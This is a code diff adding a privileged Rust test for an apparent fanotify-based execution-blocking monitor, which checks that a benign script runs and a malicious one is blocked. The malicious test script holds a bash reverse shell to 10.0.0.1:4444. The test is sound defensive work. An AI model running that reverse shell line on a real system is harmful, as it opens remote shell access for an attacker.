@@ -220,3 +220,99 @@ fn test_fanotify_health_state_transitions() {
         fanotify_cap.active_mode
     );
 }
+
+#[test]
+fn test_privileged_linux_fanotify_execution_blocking() {
+    #[cfg(target_os = "linux")]
+    {
+        use kernlock_platform::fanotify::FanotifyMonitorHealth;
+
+        let probe = FanotifyPermissionMonitor::probe_support();
+        if !probe.exec_blocking_available {
+            println!(
+                "SKIPPING privileged fanotify test: root / CAP_SYS_ADMIN required ({})",
+                probe.details
+            );
+            return;
+        }
+
+        let tmp = TempDir::new().unwrap();
+        let vault_dir = tmp.path().join("vault");
+        let test_dir = tmp.path().join("test_exec");
+        std::fs::create_dir_all(&vault_dir).unwrap();
+        std::fs::create_dir_all(&test_dir).unwrap();
+
+        let monitor = match FanotifyPermissionMonitor::init_with_target(Some(&test_dir)) {
+            Ok(m) => m,
+            Err(e) => {
+                println!(
+                    "Unable to mark fanotify on directory ({}); skipping test",
+                    e
+                );
+                return;
+            }
+        };
+
+        let rules = Arc::new(RuleEngine::builtin());
+        let policy = Arc::new(PolicyConfig {
+            mode: SecurityMode::Protection,
+            ..Default::default()
+        });
+        let get_policy = {
+            let p = policy.clone();
+            Arc::new(move || (*p).clone())
+        };
+
+        let blocked_count = Arc::new(AtomicUsize::new(0));
+        let bc = blocked_count.clone();
+        let on_threat = move |_event: kernlock_core::SecurityEvent,
+                              _alert: kernlock_core::ThreatAlert| {
+            bc.fetch_add(1, Ordering::SeqCst);
+        };
+
+        monitor.start(vault_dir, get_policy, rules, on_threat);
+        assert_eq!(
+            FanotifyPermissionMonitor::global_health().0,
+            FanotifyMonitorHealth::Running
+        );
+
+        // 1. Benign executable script
+        let clean_script = test_dir.join("clean.sh");
+        std::fs::write(&clean_script, "#!/bin/sh\nexit 0\n").unwrap();
+        #[cfg(unix)]
+        {
+            use std::os::unix::fs::PermissionsExt;
+            std::fs::set_permissions(&clean_script, std::fs::Permissions::from_mode(0o755))
+                .unwrap();
+        }
+
+        let clean_res = std::process::Command::new(&clean_script).status();
+        assert!(clean_res.is_ok());
+        assert!(clean_res.unwrap().success());
+
+        // 2. Malicious executable script
+        let malicious_script = test_dir.join("malicious.sh");
+        std::fs::write(
+            &malicious_script,
+            "#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
+        )
+        .unwrap();
+        #[cfg(unix)]
+        {
+            use std::os::unix::fs::PermissionsExt;
+            std::fs::set_permissions(&malicious_script, std::fs::Permissions::from_mode(0o755))
+                .unwrap();
+        }
+
+        let malicious_res = std::process::Command::new(&malicious_script).status();
+        // Execution must either return an OS error (e.g. PermissionDenied) or exit non-zero
+        assert!(malicious_res.is_err() || !malicious_res.unwrap().success());
+        assert!(blocked_count.load(Ordering::SeqCst) >= 1);
+
+        monitor.stop();
+        assert_eq!(
+            FanotifyPermissionMonitor::global_health().0,
+            FanotifyMonitorHealth::Stopped
+        );
+    }
+}
